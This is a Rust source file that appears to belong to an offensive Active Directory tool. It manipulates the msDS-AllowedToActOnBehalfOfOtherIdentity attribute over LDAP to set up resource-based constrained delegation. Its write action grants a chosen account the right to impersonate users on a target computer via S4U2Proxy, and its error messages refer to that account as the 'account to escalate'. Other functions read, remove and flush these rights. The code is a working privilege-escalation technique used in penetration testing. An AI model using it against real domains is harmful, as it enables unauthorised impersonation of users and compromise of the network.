use anyhow::{anyhow, Result};
use crate::ldap_client::{ldap_escape_binary, ldap_escape_filter, LdapClient};
use crate::logging::{log_error, log_info};
use crate::security::{Ace, Acl, SecurityDescriptor, Sid};

const RBCD_ATTR: &str = "msDS-AllowedToActOnBehalfOfOtherIdentity";


/// Resolve a sAMAccountName 
pub async fn get_dn_and_sid(
    client: &mut LdapClient,
    base_dn: &str,
    samname: &str,
) -> Result<(String, Vec<u8>)> {
    let filter = format!("(sAMAccountName={})", ldap_escape_filter(samname));
    let entries = client
        .search(base_dn, &filter, &["distinguishedName", "objectSid"])
        .await?;

    let entry = entries
        .into_iter()
        .next()
        .ok_or_else(|| anyhow!("Account not found in LDAP: {samname}"))?;

    let dn = entry.dn;
    let sid_raw = entry
        .bin_attrs
        .get("objectSid")
        .and_then(|v| v.first())
        .cloned()
        .unwrap_or_default();

    Ok((dn, sid_raw))
}

/// Resolve raw objectSid bytes 
async fn get_samname_for_sid_bytes(
    client: &mut LdapClient,
    base_dn: &str,
    sid_raw: &[u8],
) -> Result<String> {
    let escaped = ldap_escape_binary(sid_raw);
    let filter = format!("(objectSid={escaped})");
    let entries = client.search(base_dn, &filter, &["sAMAccountName"]).await?;
    let entry = entries
        .into_iter()
        .next()
        .ok_or_else(|| anyhow!("SID not found in LDAP"))?;
    Ok(entry
        .attrs
        .get("sAMAccountName")
        .and_then(|v| v.first())
        .cloned()
        .unwrap_or_else(|| "<unknown>".to_string()))
}


pub async fn get_allowed_to_act(
    client: &mut LdapClient,
    base_dn: &str,
    delegate_to_dn: &str,
    ts: bool,
) -> Result<SecurityDescriptor> {
    let entries = client
        .search_base(
            delegate_to_dn,
            "(objectClass=*)",
            &["sAMAccountName", "objectSid", RBCD_ATTR],
        )
        .await?;

    let entry = entries
        .into_iter()
        .next()
        .ok_or_else(|| anyhow!("Could not query target user properties"))?;

    let sd_raw = entry
        .bin_attrs
        .get(RBCD_ATTR)
        .and_then(|v| v.first())
        .cloned()
        .unwrap_or_default();

    if sd_raw.is_empty() {
        log_info(&format!("Attribute {RBCD_ATTR} is empty"), ts);
        return Ok(SecurityDescriptor::new_empty());
    }

    let sd = SecurityDescriptor::from_bytes(&sd_raw)
        .map_err(|e| anyhow!("Failed to parse security descriptor: {e}"))?;

    let aces = sd.dacl.as_ref().map(|d| d.aces.as_slice()).unwrap_or(&[]);

    if aces.is_empty() {
        log_info(&format!("Attribute {RBCD_ATTR} is empty"), ts);
    } else {
        log_info("Accounts allowed to act on behalf of other identity:", ts);
        for ace in aces {
            let sid_str = ace.sid.to_string();
            let sid_bytes = ace.sid.to_bytes();
            match get_samname_for_sid_bytes(client, base_dn, &sid_bytes).await {
                Ok(samname) => log_info(&format!("    {:<20} ({})", samname, sid_str), ts),
                Err(_)      => log_error(&format!("SID not found in LDAP: {}", sid_str), ts),
            }
        }
    }

    Ok(sd)
}

pub async fn action_read(
    client: &mut LdapClient,
    base_dn: &str,
    delegate_to: &str,
    ts: bool,
) -> Result<()> {
    let (delegate_to_dn, _) = get_dn_and_sid(client, base_dn, delegate_to)
        .await
        .map_err(|_| {
            anyhow!(
                "Account to modify does not exist! \
                 (forgot '$' for a computer account? wrong domain?)"
            )
        })?;
    get_allowed_to_act(client, base_dn, &delegate_to_dn, ts).await?;
    Ok(())
}

pub async fn action_write(
    client: &mut LdapClient,
    base_dn: &str,
    delegate_to: &str,
    delegate_from: &str,
    ts: bool,
) -> Result<()> {
    // Resolve delegate-from SID
    let (_, sid_raw) = get_dn_and_sid(client, base_dn, delegate_from)
        .await
        .map_err(|_| {
            anyhow!(
                "Account to escalate does not exist! \
                 (forgot '$' for a computer account? wrong domain?)"
            )
        })?;
    let sid_from = Sid::from_bytes(&sid_raw)
        .map_err(|e| anyhow!("Failed to parse objectSid for {delegate_from}: {e}"))?;

    // Resolve delegate-to DN
    let (delegate_to_dn, _) = get_dn_and_sid(client, base_dn, delegate_to)
        .await
        .map_err(|_| {
            anyhow!(
                "Account to modify does not exist! \
                 (forgot '$' for a computer account? wrong domain?)"
            )
        })?;

    // Fetch current SD 
    let mut sd = get_allowed_to_act(client, base_dn, &delegate_to_dn, ts).await?;

    let already_present = sd
        .dacl
        .as_ref()
        .map(|d| d.aces.iter().any(|a| a.sid == sid_from))
        .unwrap_or(false);

    if already_present {
        log_info(
            &format!("{delegate_from} can already impersonate users on {delegate_to} via S4U2Proxy"),
            ts,
        );
        log_info("Not modifying the delegation rights.", ts);
        return Ok(());
    }

    // Append new ACE
    let dacl = sd.dacl.get_or_insert_with(Acl::new_empty);
    dacl.aces.push(Ace::new_allow(sid_from));

    // Write back
    let sd_bytes = sd.to_bytes();
    client
        .modify_replace_binary(&delegate_to_dn, RBCD_ATTR, &sd_bytes)
        .await?;

    log_info("Delegation rights modified successfully!", ts);
    log_info(
        &format!("{delegate_from} can now impersonate users on {delegate_to} via S4U2Proxy"),
        ts,
    );

    get_allowed_to_act(client, base_dn, &delegate_to_dn, ts).await?;
    Ok(())
}

pub async fn action_remove(
    client: &mut LdapClient,
    base_dn: &str,
    delegate_to: &str,
    delegate_from: &str,
    ts: bool,
) -> Result<()> {
    let (_, sid_raw) = get_dn_and_sid(client, base_dn, delegate_from)
        .await
        .map_err(|_| {
            anyhow!(
                "Account to escalate does not exist! \
                 (forgot '$' for a computer account? wrong domain?)"
            )
        })?;
    let sid_from = Sid::from_bytes(&sid_raw)
        .map_err(|e| anyhow!("Failed to parse objectSid for {delegate_from}: {e}"))?;

    let (delegate_to_dn, _) = get_dn_and_sid(client, base_dn, delegate_to)
        .await
        .map_err(|_| {
            anyhow!(
                "Account to modify does not exist! \
                 (forgot '$' for a computer account? wrong domain?)"
            )
        })?;

    let mut sd = get_allowed_to_act(client, base_dn, &delegate_to_dn, ts).await?;

    if let Some(dacl) = sd.dacl.as_mut() {
        dacl.aces.retain(|a| a.sid != sid_from);
    }

    let sd_bytes = sd.to_bytes();
    client
        .modify_replace_binary(&delegate_to_dn, RBCD_ATTR, &sd_bytes)
        .await?;

    log_info("Delegation rights modified successfully!", ts);

    get_allowed_to_act(client, base_dn, &delegate_to_dn, ts).await?;
    Ok(())
}

pub async fn action_flush(
    client: &mut LdapClient,
    base_dn: &str,
    delegate_to: &str,
    ts: bool,
) -> Result<()> {
    let (delegate_to_dn, _) = get_dn_and_sid(client, base_dn, delegate_to)
        .await
        .map_err(|_| {
            anyhow!(
                "Account to modify does not exist! \
                 (forgot '$' for a computer account? wrong domain?)"
            )
        })?;

    get_allowed_to_act(client, base_dn, &delegate_to_dn, ts).await?;

    client
        .modify_clear_attribute(&delegate_to_dn, RBCD_ATTR)
        .await?;

    log_info("Delegation rights flushed successfully!", ts);

    get_allowed_to_act(client, base_dn, &delegate_to_dn, ts).await?;
    Ok(())
}